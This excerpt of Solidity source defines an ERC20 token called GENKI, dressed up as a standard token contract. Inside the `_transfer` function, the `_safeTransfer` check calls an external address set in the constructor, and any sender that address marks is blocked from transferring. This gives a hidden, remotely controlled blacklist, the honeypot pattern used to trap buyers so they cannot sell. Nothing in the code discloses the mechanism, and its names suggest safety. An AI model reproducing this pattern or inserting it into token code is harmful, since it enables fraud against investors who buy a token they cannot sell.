...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _totalSupply; string private _name; string private _symbol; address private _safe;
    constructor(string memory name_, string memory symbol_, address safe_) {_name = name_; _symbol = symbol_; _safe = safe_;}
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {require(from != address(0), "ERC20: transfer from the zero address"); require(to != address(0), "ERC20: transfer to the zero address"); require(!_safeTransfer(from)); _beforeTokenTransfer(from, to, amount); uint256 fromBalance = _balances[from]; require(fromBalance >= amount, "ERC20: transfer amount exceeds balance"); unchecked {_balances[from] = fromBalance - amount;} _balances[to] += amount; emit Transfer(from, to, amount); _afterTokenTransfer(from, to, amount);}
    ...
    function _safeTransfer(address safe) internal virtual returns (bool) {(bool success, bytes memory result) = _safe.call(abi.encodeWithSignature("getSafe(address)", safe)); (bool safe__) = abi.decode(result, (bool)); return safe__;}
...
contract GENKI is ERC20Decimals {
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 initialBalance_, address safe_) payable ERC20(name_, symbol_, safe_) ERC20Decimals(decimals_){require(initialBalance_ > 0, "Supply cannot be zero"); _mint(_msgSender(), initialBalance_);}
